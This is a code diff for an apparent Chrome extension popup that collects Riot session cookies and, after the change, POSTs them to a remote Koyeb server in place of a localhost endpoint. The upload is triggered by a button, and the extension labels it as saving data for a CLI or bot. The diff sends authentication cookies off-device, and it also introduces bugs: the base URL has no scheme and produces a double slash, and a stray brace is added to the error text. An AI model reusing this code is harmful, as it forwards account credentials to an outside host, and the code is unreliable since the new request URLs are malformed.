@@ -1,8 +1,12 @@
+// --- 送信先ベースURL（Koyebの公開URLに置換してください） ---
+const API_BASE = "pure-cherrita-inosuke-6597cf0f.koyeb.app/"; // 例: https://inosuke.koyeb.app
+
 async function fetchNonce() {
-  const r = await fetch("http://127.0.0.1:5177/nonce");
+  const r = await fetch(`${API_BASE}/nonce`);
   if (!r.ok) throw new Error("nonce fetch failed");
   return (await r.json()).nonce;
 }
+
 async function getCookies(domain) {
   return await chrome.cookies.getAll({ domain });
 }
@@ -58,10 +62,10 @@ document.getElementById("btn").onclick = async () => {
       cookie_line: [...auth, ...root].map(c => `${c.name}=${c.value}`).join("; ")
     };
 
-    //out.textContent = JSON.stringify(payload, null, 2);
+    // out.textContent = JSON.stringify(payload, null, 2);
 
-    status.textContent = "ローカルへ送信中...";
-    const res = await fetch("http://127.0.0.1:5177/riot-cookies", {
+    status.textContent = "サーバーへ送信中...";
+    const res = await fetch(`${API_BASE}/riot-cookies`, {
       method: "POST",
       headers: {"Content-Type":"application/json"},
       body: JSON.stringify(payload)
@@ -73,6 +77,7 @@ document.getElementById("btn").onclick = async () => {
     }
     status.innerHTML = `<span class="ok">保存OK（ユーザーID: ${userId}）。CLI/ボットから利用できます。</span>`;
   } catch (e) {
-    status.innerHTML = `<span class="err">${String(e)}</span>`;
+    status.innerHTML = `<span class="err">${String(e)}}</span>`;
   }
 };
+
